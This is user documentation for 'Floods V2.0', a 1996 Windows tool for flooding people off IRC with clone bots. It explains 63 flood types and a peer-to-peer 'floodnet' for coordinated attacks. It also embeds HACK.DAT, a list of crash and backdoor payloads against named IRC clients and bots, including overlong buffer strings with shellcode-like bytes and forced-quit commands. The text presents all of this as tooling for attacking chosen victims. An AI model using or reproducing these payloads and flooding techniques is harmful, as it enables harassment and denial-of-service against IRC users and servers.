@@ -1,0 +1,772 @@
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+                                Floods V2.0
+                               Documentation
+
+                       Floods Copyright 1996 H-Master
+
+
+No parts of this document can be replicated, without the WRITTEN consent of
+the copyright holder, for uses other than the promotion / distribution of this
+software.
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Contents  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        Contents
+        Introduction
+        Legal Issues
+        Features
+        Bare Necessities
+        Quick Start
+        Explanations of Main Menu Commands
+        Explanations of Sub Menus
+        Floodnet / Botnet
+        Embedded Copy of HACK.DAT
+        News
+        Contact Information
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Introduction  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        Floods is a program you use to flood someone off IRC.  It includes a
+        list of backdoors as well as commands to control unlimited bots to
+        flood someone out.  Floods is an extremely useful tool and is VERY
+        devastating and thus should not be used often as that may cause your
+        ISP to be K-Lined from the IRC network.
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Legal Issues  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        Although Floods is a FREEWARE, it is NOT public domain software.
+
+        If you would like to distribute Floods as part of a shareware
+        distribution, magazine, internet book, CD ROM, etc.  please contact me
+        for permission.
+
+        All commercial use interests in Floods should be directed to
+        h-master@post1.com.
+
+        The integrity of the original Floods distribution file as distributed
+        by the author is essential.  Floods and all of its related files must
+        be distributed together in the original format.  The Floods
+        distribution file may not have files added to it or removed from it,
+        and none of its contents may be modified, decompiled, or reverse
+        engineered.
+
+        Floods is provided "AS IS" without warranty of any kind, either
+        express or implied, including but not limited to the implied
+        warranties of merchantability and fitness for a particular purpose.
+        In no event shall the author be liable for any damages whatsoever
+        including direct, indirect, incidental, consequential, loss of
+        business profits or special damages, even if the author has been
+        advised of the possibility of such damages.
+
+        Floods is provided as an educational medium.  All uses of Floods are
+        assumed by the author to be for education.  In no event shall the
+        author be liable for any damages whatsoever including direct,
+        indirect, incidental, consequential, loss of business profits or
+        special damages, even if the author has been advised of the
+        possibility of such damages, due to the misuse of this software,
+        improper handling of this software, etc.
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Features  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        Features of Floods:
+
+        -> Direct IRC connection.  No need for mIRC / other programs.
+        -> Complete control over ALL the bots.
+        -> Bots are not pre-loaded and are only loaded when you require them.
+           This saves memory.
+        -> Fast!  The code has been optimised and re-optimised and is very
+           fast.
+        -> Floods will stop flooding once the victim is dead or changed his
+           nick.  Great way to stop your bots are getting lagged themselves!
+        -> Flood protection.  Everytime someone sends you a message or CTCP or
+           whatever, he will be ignored for one minute.  The ignroe is set for
+           *!*@<whatever> so clones DO NOT work.
+        -> 21 different floods at 3 different flood levels.  That's a whopping
+           63 floods!
+        -> Includes backdoors for a lot of scripts / bots/clients.  The list
+           of backdoors is in HACK.DAT and can be edited by YOU to reflect
+           changes or additions.
+        -> Includes a raw command processor that accepts simple script
+           commands.
+        -> Floodnet / Botnet ability!
+        -> A Floods Advisor which will give you advise on what types of floods
+           to use after asking some questions about the situation.
+        -> Includes 3 level of logging.
+        -> For more enhancements, refer to WHATS.NEW .
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Bare Necessities  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        I'm not sure of this list, but it should not be too far off.
+
+        -> IBM PC or compatible.
+        -> Microsoft Windows 3.x or Microsoft Windows 95 / NT.
+        -> Winsock 1.1 API compliant networking package.
+        -> Access to internet via PPP.
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Quick Start  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        Here's how to start flooding ASAP!
+
+        1. Decompress the package which Floods came in.  If you are reading
+           this, you should already done that.
+        2. You should get the following files:
+
+*       CSWSKCTL VBX        43,648  11-29-96 12:34p CSWSKCTL.VBX
+        FILE_ID  DIZ           858  01-23-97  1:00a FILE_ID.DIZ
+        FLOODS   DOC        39,407  01-23-97  1:00a FLOODS.DOC
+*       FLOODS   EXE       299,952  01-23-97  1:00a floods.exe
+*       HACK     DAT         2,491  01-18-97  1:00a HACK.DAT
+        WHATS    NEW         4,552  01-23-97  1:00a WHATS.NEW
+
+        <Note: Those files marked with a "*" are required for the proper>
+        <execution of the program.                                      >
+
+        3. Delete all the files you do not want.
+        4. Start your internet connection.
+        5. Execute FLOODS.EXE and have fun!
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Explanations of Main Menu Commands  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        Here's a BRIEF explanation of the menu commands in the Main Menu.
+
+        In the Main Menu (the thing you see immediately when you start the
+        program), there are five menus.  They are:
+
+        Bots            Includes commands to control the bots.
+        Light Floods    Includes floods that are meant only to be irritating.
+        Medium Floods   Includes floods that are meant to flood off people with
+                                bad or no flood protection.
+        Heavy Floods    Includes floods that are meant to flood off most
+                                people.
+        Hacks           Includes backdoors for a number of
+                                scripts / bots / clients.
+
+
+        Under the Bots menu, you will find:
+
+        Config          To let you configure the logging type.
+        Load            To let you load more bots.
+        Stop Loading    To pause the loading process.  Load more bots to
+                                resume the loading process.
+        Unload          To let you unload loaded bots, so as to save memory.
+        Advisor         Starts the Floods Advisor,
+        Stop Flooding   To stop flooding on a certain nick.
+        Stop All Flooding To stop flooding everyone.
+        Change Server   To let you change the server of the bots.
+        Change Nick     To let you change the nicks of the bots.
+        Raw Command     To let you directly control a bot.
+        Network         To let you connect to a Floods Floodnet / Botnet
+                                server.
+        Exit            To exit the program.
+
+
+        Under the three flood menus, you will find:
+
+        Action          Floods someone with actions.
+        Clientinfo      Floods someone with clientinfos requests.
+        CTCP Kill       Floods someone with ALL the CTCP floods.
+        DCC Chat        Floods someone with DCC chats.
+        DCC Send GarbageFloods someone with DCC sends.
+        DCC Kill        Floods someone with both DCC chats and sends.
+        Echo            Floods someone with echo requests.
+        Finger          Floods someone with finger requests.
+        Halibut         Floods someone with halibuts.
+        Hurrican        Floods someone with the original Hurrican floods.
+        Junk Text       Floods someone by sending him junk messages.
+        Notice          Floods someone by sending him junk notices.
+        Ping            Floods someone with ping requests.
+        Ping Reply      Floods someone by faking ping replys.
+        Random          Floods someone with a random flood.
+        Sed             Floods someone with seds.
+        Sound           Floods someone with sound requests.
+        Time            Floods someone with time requests.
+        Trout           Floods someone with trouts.
+        Tsunami         Floods someone with a tsunami.
+        Userinfo        Floods someone with userinfo requests.
+        Version         Floods someone with version requests.
+
+        <Note: The differece between the third floods (Light, Medium and  >
+        <Heavy) is the interval between floods and the number of floods to>
+        <send.                                                            >
+
+        <Note: A flood can also be used to flood a channel.  Use put the>
+        <name of the channel instead of the name of a person to flood a >
+        <channel.                                                       >
+        <E.G:                                                           >
+        < #mirc                                                         >
+
+
+        Under the Hacks menu, you will find:
+
+        Clients         Includes backdoors for clients.
+        Scripts/Bots    Includes backdoors for scripts / bots.
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Explanations of Sub Menus  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        When you select certain options in the Main Menu menu commands, a new
+        menu will pop up.  This section describes those menus.  Note that for
+        ALL sub menus, you must click on the label of the menu (The big button
+        at the very top) in order to activate the command requested.  Clicking
+        on the button also closes the sub menu.  If you want to close the sub
+        menu but not to perform the command, then use ALT-F4.
+
+        When you choose Configuration, you will get a menu with the following:
+
+        Log nothing at all.
+        Log everything that is important.
+        Log everything.
+
+        These three options determine how sensitive the logging is.
+
+        Choosing "Log nothing at all." will disable logging.
+        Choosing "Log everything that is important." will only log important
+                events such as logging in and reconnection.
+        Choosing "Log everything." will log everything the bot receives in
+                addition to what the bot does.
+
+
+        When you choose Load Bots, you will get a menu with the following:
+
+        Number of clones to load:
+        Server to use:
+        Port of server:
+        Fake e-mail:
+        "Real" name:
+        Non-sequential nicks
+
+        "Number of clones to load:" refers to the number of bots you wish to
+                load or add to already existing ones.
+        "Server to use:" refers to the name or IP of the server to connect to.
+        "Port of server:" refers to the port of the server you are connecting
+                to.  Usually, this value should be 6667, 7000, 6666, 6668 or
+                6665, with 6667 being the most common and 6665 the least.
+        "Fake e-mail:" refers to the e-mail address you wish to appear from.
+                Note that if you have an ident server running, then the remote
+                server will take the value from the ident server.
+        ""Real" name:" refers to the name you want others to see when they do
+                a WHOIS on you.
+        "Non-sequential nicks" when checked, will mean that the bots will not
+                have nicks with their numbers-1 appended.
+                E.G:
+                If you have it off, bot one may have a nick like "Dav0" and
+                bot two one like "Dav1"
+                If you have it on, bot one may have a nick like "Dav" and bot
+                two "Fat"
+
+
+        When you choose Unload Bots, you will get a menu with the following:
+
+        Number of clones to unload:
+        Quit gracefully
+        Quit without informing server
+
+        "Number of clones to unload:" refers to the number of bots to unload
+                starting from the BACK.
+                E.G:
+                If you have 5 bots on and you unload 3 then only bots 1 and 2
+                will remain.
+
+        "Quit gracefully" and "Quit without informing server" are used to
+        determine how the bot quits.
+
+        By using "Quit gracefully", the bot will first inform the server that
+                it is quitting before disconnecting.
+        By using "Quit without informing server", the bot will just
+                disconnect.  This will cause the bot to appear to be still on.
+                Until the server pings the bot, the resources dedicated to the
+                bot by the server will be lost.
+
+
+        When you choose Advisor, you will get a menu with the following:
+
+        Some questions, options.
+
+        Answer all the questions truthfully and if you do not know any of the
+        first 3 answers, put in the second smallest value.  If you do not know
+        any of the least 2 answers, put in the biggest value.  Note that the
+        reply from the Advisor MAY NOT be correct.  You should add in a bit of
+        common sense.  If your flood fails, try increasing the "dosage" and if
+        it got your bots off too often, try decreasing it.  If that still does
+        not work, then e-mail me and give as much information about the
+        situation as possible.  Of course, this would mean that you will not
+        be able to flood the victim then, but then, at least you get to learn.
+
+
+        When you choose Change Server, you will get a menu with the following:
+
+        From ? to ?
+        Change server to:
+        Server to use:
+        Fake e-mail:
+        "Real" name:
+        Non-sequential nicks
+        
+        "From ? to ?" refers to the start and end of the bots to perform the
+                action.  The first "?" refers to the start bot number and the
+                other refers to the end bot number.
+                E.G:
+                "From 1 to 3" means that clones 1, 2 and 3 will perform the
+                action.
+
+        "Change server to:" refers to the name or IP of the server to connect to.
+
+        For explanations of "Port of server:", "Fake e-mail:", ""Real" name:"
+                and "Non-sequential nicks" refer to previous explanations.
+
+
+        When you choose any flood, you will get a menu with the following:
+
+        Flood Type:
+        Flood:
+        From ? to ?
+
+        "Flood Type:" is already set and refers to the flood you are going to
+                release.
+        "Flood:" refers to the person / channel to flood.
+
+        For explanations of "From ? to ?", refer to previous explanation.
+
+
+        When you choose Change Nick, you will get a menu with the following:
+
+        From ? to ?
+        Change nick to:
+
+        "Change nick to:" refers to the nick to change to.
+
+        For explanations of "From ? to ?", refer to previous explanation.
+
+        <Note: If in "From ? to ?", both the "?" are the same, then the bot>
+        <will change to a non-sequential nick.                             >
+        <E.G:                                                              >
+        <From 1 to 1, new nick = "David"                                   >
+        <Bot 1 will change nick to "David"                                 >
+
+
+        When you choose Raw Command, you will get a menu with the following:
+
+        From ? to ?
+        Command to send:
+
+        "Command to send:" refers to the command to send.  Note that this
+                command is in the form of direct server commands, so to send
+                a message, you will use:
+                PRIVMSG <NICK / CHANNEL> <MESSAGE>
+                You are not advised to use this option if you are unfamiliar
+                with direct server commands.  Note that if you want to perform
+                more than one command, you can seperate them with a "|".
+                Also, having a number in front of a command will make the bots
+                perform the action for that number of times.  Note that this
+                timer CANNOT be nested, so "2 2 PRIVMSG #mirc Hello" will NOT
+                send 4 "Hello"s to #mirc, but will just give an error.
+                E.G:
+                If you have bots 1 to 3 performing "2 PRIVMSG #mirc Hello"
+                then the sequence of actions will be:
+
+                Bot 1 -> PRIVMSG #mirc Hello
+                Bot 2 -> PRIVMSG #mirc Hello
+                Bot 3 -> PRIVMSG #mirc Hello
+                Bot 1 -> PRIVMSG #mirc Hello
+                Bot 2 -> PRIVMSG #mirc Hello
+                Bot 3 -> PRIVMSG #mirc Hello
+
+                If you have bots 1 to 3 performing "PRIVMSG #mirc Hello |
+                PRIVMSG #mirc Hello again!" then the sequence of actions will
+                be:
+
+                Bot 1 -> PRIVMSG #mirc Hello
+                Bot 2 -> PRIVMSG #mirc Hello
+                Bot 3 -> PRIVMSG #mirc Hello
+                Bot 1 -> PRIVMSG #mirc Hello again!
+                Bot 2 -> PRIVMSG #mirc Hello again!
+                Bot 3 -> PRIVMSG #mirc Hello again!
+
+                <Note: Due to the fact that some bots may be faster than    >
+                <others and that some bots may be tied down performing other>
+                <commands, the sequence may NOT be strictly followed.       >
+
+        For explanations of "From ? to ?", refer to previous explanation.
+
+
+        When you choose Network, you will get a menu with the following:
+
+        Connect / Disconnect
+        Connected
+        Hop list
+        And a dropdown menu with:
+        Chat
+        Flood
+        Sort Lists
+        Find an IP
+
+        "Connect / Disconnect" is a button that displays either "Connect" or
+                "Disconnect" depending whether you are connected, as a client,
+                or not.  Use this button to disconnect or connect.
+        "Connected" contains a list of ALL the clients / servers connected to
+                the network.
+        "Hop list" contains a list of ALL the clients / servers connected to
+                the network with the route messages will take to reach them.
+                E.G:
+                111.111.111.111|666.666.666.666|222.222.222.222
+                means that if you want to send a message to 222.222.222.222
+                you need to send the message to 111.111.111.111 which will
+                send the message to 666.666.666.666 which will in turn send
+                the message to 222.222.222.222.
+        Chat            Start the network chatting menu.
+        Flood           Starts the network flood menu, which will let you
+                                select a flood for everyone to flood the
+                                victim with.
+        Sort Lists      Sorts both your list of network clients / servers.
+        Find an IP      Finds either an IP or a hop list in your lists.
+                        E.G:
+                        If you want to find IP 111.111.111.111 you type in
+                        "111.111.111.111".  If you want to find the message
+                        route to 111.111.111.111, you type "route
+                        111.111.111.111". If you already know the route and
+                        just want to have a look at it, type in
+                        "666.666.666.666|111.111.111.111", whereby
+                        666.666.666.666 is the route.  If you want to list all
+                        the clients whose route contain 111.111.111.111 you
+                        type in "path 111.111.111.111", note that this list
+                        will include "111.111.111.111" itself.
+
+        <Note: If you choose Network without being the client to any       >
+        <connection, then you will be asked whether you want to connect to >
+        <anyone.  You need to connect to someone or have someone connect to>
+        <you before you can chat over the network or request for a network >
+        <flood.                                                            >
+
+
+        When you choose Chat, you will get a menu with the following:
+
+        A list box
+        A text box
+
+        The list box will list all the conversation that took place and any
+                other network message such as someone requesting for a flood.
+                Note that if you want to clear the list, just double click
+                on any line in the list box.
+        The text box will allow you to chat.  If you just type a message in,
+                then the message will reach everyone on the network.  If you
+                use "/MSG <IP> <MESSAGE>", whereby <IP> is the address of
+                someone on the network and <MESSAGE> is the message you want
+                to send, the message will only reach <IP>.  It is a good idea
+                to inform others via chat before starting a network flood.
+
+
+        When you choose Flood, you will get a menu with the following:
+
+        Flood level
+        One dropdown list
+        Flood:
+
+        "Flood level" refers to the intensity of the flood, Light, Medium or
+                Heavy.
+        The dropdown list is used to let you select the flood to request.
+        "Flood:" refers to the nick to flood.
+
+
+        When you choose Hacks, you will get a menu with the following:
+
+        One dropdown list
+        Bot number:
+        Send to:
+
+        The dropdown list is used to let you select the backdoor to use.
+        "Bot number:" refers to the bot to perform the backdoor.
+        "Send to:" refers to the person to receive the backdoor.
+
+        <Note: ALL backdoors are stored in HACK.DAT, which you are edit   >
+        <yourself to reflect changes or additions.  The format of HACK.DAT>
+        <is:                                                              >
+        <                                                                 >
+        <-----<Client/Script>-----                                        >
+        <followed by the hacks.                                           >
+        <                                                                 >
+        <The hacks themselves are in the format:                          >
+        <                                                                 >
+        < <Name of hack>:<Command>                                        >
+        <                                                                 >
+        <The <Command> format is similiar to the format for raw commands. >
+        <                                                                 >
+        <There are 3 additional tags for <Command>.  They are:            >
+        <                                                                 >
+        < $1 -> Refers to the person to send the backdoor to.             >
+        < #  -> Refers to the channel to send the backdoor to.  If there  >
+        <               is no "#" in front, then one will be added.       >
+        < $? -> The format of this is: $?="<Message>".  Whereby <Message> >
+        <               refers to a prompt to ask for a command.          >
+        <                                                                 >
+        < For more information, refer to the copy of HACK.DAT embedded in >
+        < this document.                                                  >
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Floodnet / Botnet  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        There is now a new way to flood.  It normally consists of an eggdrop
+        or some other server which is permanantly on IRC.  If someone wishes
+        to join the network, he dcc chats or raw connect to the eggdrop.  When
+        anyone on the network decides he doesn't like the nick of a victim, he
+        can use a command, such as !pkill, and EVERYONE on the network with
+        Floodnet / Botnet compatibility will start flooding the victim.  This
+        way, using conventional flood protection, Ignore after 5-10
+        messages / CTCPs, will still get the victim off.
+
+        Floods has its own built-in Floodnet / Botnet.  When you wish to
+        connect to someone, just go to the main menu and select Bot->Network.
+        Floods will then prompt you whether you want to connect and so on.
+        Alternatively, you can go to the Network sub menu and click on the
+        Connect button.  If you can connected, the connect button will change
+        to disconnect.  Refer to "Explanations of Main Menu Commands" and
+        "Explanations of Sub Menus" for more information.
+
+        However, there is ONE difference between conventional Floodnet /
+        Botnet and Floods' Floodnet / Botnet.  For Floods' Floodnet / Botnet,
+        you DO NOT NEED A SERVER.  Everyone on the network can be a server and
+        a client.  However, you can only be the client in ONE connection.  For
+        example:
+
+                  A -<- B -<- C
+                        |
+                        ^
+                        |                    A -<- B means that B is a client
+                  F ->- D -<- E              connected to A.
+
+        In this sample network, there is no prominent server, except maybe for
+        A.  In this example, if B decides to flood someone, B will send the
+        command string to all DIRECTLY connected to himself: A, C and D.  Then
+        those 3 will send the command string to those DIRECTLY connected to
+        them, EXCEPT B.  This way, ALL the clients / servers get the command.
+
+        The only two drawbacks of this system of networking is that if B
+        disconnects, A and C will be out of the network.  However, the good
+        news is that Floods will automatically make C and D connect to A.
+        The other drawback is that if D is desperately lagged, then when B
+        wants to flood someone, E and F may not get the message fast enough.
+        But then, this way, as there is no server, no single one of the clients
+        / servers will get too lag due to the network.  Of course, if you can
+        get me a FAST PERMANENT site for an eggdrop, I would gladly set one
+        server up.  Of course, other than the server, I may use the site for
+        other stuff :).
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Embedded Copy of HACK.DAT  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        This is a copy of the HACK.DAT file contained in the Floods package.
+
+-----------------------<< Start of HACK.DAT >>-----------------------
+-----SCRIPT-----
+Borg Talk:PRIVMSG # : ป๒ฐฏึ
+Chark Bot:PRIVMSG $1 :ZJEHOVAH | PRIVMSG $1  :ZLEVITICUS | PRIVMSG $1  :ZEXODUS | PRIVMSG $1  :ZGENESIS
+ClayBear Kill:PRIVMSG $1 :DO /quit
+ComBot Kill:PRIVMSG $1 :dcc
+CToolZ Flash:NOTICE $1 :TESTIG !!
+Djinn:PRIVMSG $1 :DCC SEND blah&kill
+DweebBot:PRIVMSG $1 :ooook
+Eggdrop Kill:PRIVMSG $1 :Hello | 3 PRIVMSG $1 :whois 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000๋^3าVVธV45V4Nัอ€3ภ@อ€่ื
+GODbot:PRIVMSG $1 :l33t | PRIVMSG $1 :go l33t lamah
+Hot Ice V2:PRIVMSG # :a=00220022ice
+Killer:PRIVMSG $1 :/kgkill /quit KGKILL!
+M and L:PRIVMSG # :OPME | PRIVMSG # :lunizop
+Pierce:PRIVMSG $1 :+say /quit
+Speed Script:PRIVMSG $1 :ฟ
+Stealth User:NOTICE $1 :53764^B^B856324^B^B32fd563gf^Vds5rx^B^Bfdtsr5ss54
+Vlad Kill 1:PRIVMSG $1 :note create public time to die | PRIVMSG $1 :note delline | PRIVMSG $1 :note delline 8 | PRIVMSG $1 :note create public 4 m-eye frendz | PRIVMSG $1 :note delline 2
+ZoDiaC:PRIVMSG $1 :SUP
+-----CLIENT-----
+Acid!IRC:PRIVMSG # :
+ircii(Linux reg):PRIVMSG $1 :DCC CHAT cow 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 1234 moo 1 $+ 
+IRCLE (Mac Client):PRIVMSG $1 :GESTALT
+Mirc 3.8:JOIN #hellothere! | INVITE $1 #hellothere! | INVITE $1 #hellothere!youpieceofshit!
+Mirc 3.8 2:JOIN #^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ | TOPIC #^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ | INVITE $1 #^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ | PART #^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+VaX:PRIVMSG $1 :action says hello
+WSIRC Kill:PRIVMSG $1 :A
+-----------------------<< End of HACK.DAT >>-----------------------
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  News  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+     This new section is devoted to announcements, interesting stuff, tips,
+     tricks, questions, etc. on Floods and Floods LITE.  Feel free to send me
+     e-mail on additions for this section.
+
+        - Announcements -
+
+        -> You can now get the latest copy of Floods at
+           http://www.post1.com/~h-master
+
+        -> Note that my e-mail has changed!
+
+        -> I really need a site where you can run an eggdrop, so as to set up
+           a permanent Floodnet / Botnet server.  If you send me one that is
+           fast and works, I will upgrade you to supporter status.  Also, if
+           you require payment, we can always come to an agreement.
+
+
+        - Interesting Stuff / Tips / Tricks -
+
+        -> Pros and Cons of different types of networking.
+           - If you are in the middle of the network, such as B and D,
+
+                  A -<- B -<- C
+                        |
+                        ^
+                        |                    A -<- B means that B is a client
+                  F ->- D -<- E              connected to A.
+
+             your messages will be spread to the most people in the least
+             time.  This mean that if you want to flood someone, more people
+             will be able to flood with you then if you are at the end of a
+             network, such as F, E, A and C.  However, you must have a fast
+             connection or else all the messages passing through you to get
+             to the others will lag you.
+
+           - I am going to introduce 3 types of networking to you.  I am not
+             sure whether they have any "accepted" name and will make them
+             up as we go along.
+
+             The first type is linear networking:
+
+                  A -<- B -<- C              A -<- B means that B is a client
+                                             connected to A.
+
+             This, in my opinion is the WORST way to form a network.  If any
+             client / server in the middle decides to disconnect, the entire
+             network breaks up into 2.  Worst still, if C wants to flood
+             someone, by the time the message reaches A, C may already have
+             started flooding.  This means that it's harder to flood together.
+             Imagine if the network consists of 10 clients / servers.  If the
+             first wants to flood, he may already stop before the last one
+             starts flooding!
+
+             The second type is server-based networking:
+
+                  A ->- B -<- C              A -<- B means that B is a client
+                        |                    connected to A.
+                        ^
+                        |
+                        D
+
+             In this case, B is the server.  This is a better type of
+             networking than linear networking because if any CLIENT
+             disconnects, the network is still in one "piece".  Also, the
+             maximum number of computers any message has to pass through is
+             one, excluding the sender and receiver.  However, there are some
+             requirements.  Firstly, B must be VERY fast especially if it's
+             a large network, otherwise, the entire network gets lagged and
+             messages cannot get around fast enough.  Secondly, if B does
+             down, the entire network is gone.  Not in 2 "pieces" as in linear
+             networking, but totally gone.
+
+             The last type is client-based networking:
+
+                  A -<- B -<- C
+                        |
+                        ^
+                        |                    A -<- B means that B is a client
+                  F ->- D -<- E              connected to A.
+
+             In my opinion, this is the best of both worlds.  It isn't as slow
+             as linear networking, it doesn't require any particular
+             client / server to be super fast and it doesn't break up totally
+             if any client / server quits.  However, as it is still more or
+             less linear-based, it is slower than server-based networking
+             (assuming it takes one unit of time for a message to be passed
+             from any one client / server to another) and it requires that
+             SOME of the clients / servers be reasonaly fast, between linear
+             and server-based requirements.
+
+
+        - Frequently Asked Questions -
+
+        -> Q: When I start Floods, it says that I do not have some of the
+              files.  Where can I get them?
+           A: You should be able to get ALL the files required by Floods at my
+              homepage.  If you can't, leave me a message.
+
+        -> Q: Windows reported that I have a "device unavailible" error.  What
+              should I do?
+           A: Your copy of winsock.dll is not compatible with Floods.  Get a
+              new one.  Note that the copy of winsock I am using is the one
+              supplied with Windows 95.
+
+        -> Q: When I start the program, Windows 95 says that the language file
+              is missing and refuses to run the program.
+           A: This is quite a common problem.  There are 2 solutions I can
+              think of.  They are:
+
+              1. Install Visual Basic 4.0.  Once installed, VB4 will set the
+                 language.dll option in your win.ini.
+              2. Set the language.dll option yourself.  An easy way to do this
+                 is to run setup, change the language to something else.  Then
+                 save the new settings.  After that, if you want the language
+                 to be the old one, then run setup again and change it back.
+                 Note that this is not guranteed to work, but it worked for
+                 me.
+
+
+        - Others -
+
+        -> This area is closed until someone posts me something to say.
+
+
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บฐฐ  Contact Information  ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐบ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+        If for some reason or another you wish to contact me, here's my info.
+
+        IRC Nick     : H-Master
+        IRC Network  : Galaxynet / EFnet / Dalnet (In order of perferences)
+        E-mail       : h-master@post1.com (No flames / chains / bombs!)
+
+        If you want to get the latest copy of Floods, e-mail me or get it from
+        http://www.post1.com/~h-master
+
+        If you want me to add you to my list of registered users, just e-mail
+        me a reason why you like Floods so much AND an enhancement you would
+        like to see in the next release of Floods.  Include your e-mail
+        address, IRC nick, the IRC network(s) you visit most often and the
+        version of Flood you are talking about.  If any of the above
+        information is not supplied, then your application may be void.
+        Registered users DO NOT have to pay (for now anyway) and will receive
+        notifications of new Floods releases by e-mail.
+        
+        <Note: A bugfix is considered an enhancement.  If you are already a >
+        <registered user and you send me another enhancement, then you will >
